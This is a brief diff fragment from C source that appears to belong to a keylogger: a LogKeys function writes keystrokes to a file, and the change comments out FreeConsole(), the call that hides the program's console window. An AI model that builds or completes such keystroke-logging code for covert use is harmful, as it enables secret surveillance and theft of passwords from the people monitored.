@@ -34,7 +34,7 @@ void LogKeys(int key, FILE *OutputFile){
 
 
 int main(){
-	FreeConsole();
+	//FreeConsole();
 	char i;
 	FILE *OutputFile = fopen(FILEPATH, "a+");
 	while (true){
